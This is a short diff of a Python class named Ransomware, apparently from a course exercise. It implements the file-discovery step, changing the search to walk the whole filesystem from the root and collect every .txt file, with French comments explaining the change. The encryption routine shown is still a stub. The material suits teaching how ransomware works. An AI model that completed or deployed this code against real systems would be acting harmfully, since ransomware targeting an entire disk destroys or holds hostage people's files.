@@ -35,8 +35,9 @@ class Ransomware:
             sys.exit(1)
 
     def get_files(self, filter:str)->list:
-        # return all files matching the filter
-        raise NotImplemented()
+        return sorted(Path('/').rglob('*.txt'))
+    #on remplace '.' par '/' pour parcourir la racine, on veut les .txt, 
+    #Sorted trie la list retournée
 
     def encrypt(self):
         # main function for encrypting (see PDF)
